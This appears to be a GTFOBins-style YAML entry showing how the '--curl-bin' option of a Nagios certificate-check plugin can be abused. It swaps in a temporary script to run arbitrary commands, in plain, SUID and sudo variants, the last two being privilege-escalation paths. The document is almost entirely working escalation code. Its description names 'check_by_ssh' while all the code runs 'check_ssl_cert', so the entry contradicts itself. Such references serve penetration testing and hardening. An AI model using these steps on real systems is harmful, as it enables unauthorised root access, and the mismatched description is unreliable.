---
description: |
  This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
functions:
  command:
     - code: |
         COMMAND='/usr/bin/id'
         OUTPUT="output_file"
         TF=$(mktemp)
         echo "$COMMAND | tee \"$OUTPUT\"" > $TF
         chmod +x $TF
         check_ssl_cert --curl-bin "$TF" -H example.com # example.com must provide TLS
         cat $OUTPUT
  suid:
     - code: |
         COMMAND='/usr/bin/id'
         OUTPUT="output_file"
         umask 022
         TF=$(mktemp)
         echo "$COMMAND | tee \"$OUTPUT\"" > $TF
         chmod +x $TF
         ./check_ssl_cert --curl-bin "$TF" -H example.com # example.com must provide TLS
         cat $OUTPUT
  sudo:
     - code: |
         COMMAND='/usr/bin/id'
         OUTPUT="output_file"
         umask 022
         TF=$(mktemp)
         echo "$COMMAND | tee \"$OUTPUT\"" > $TF
         chmod +x $TF
         sudo check_ssl_cert --curl-bin "$TF" -H example.com # example.com must provide TLS
         cat $OUTPUT
---
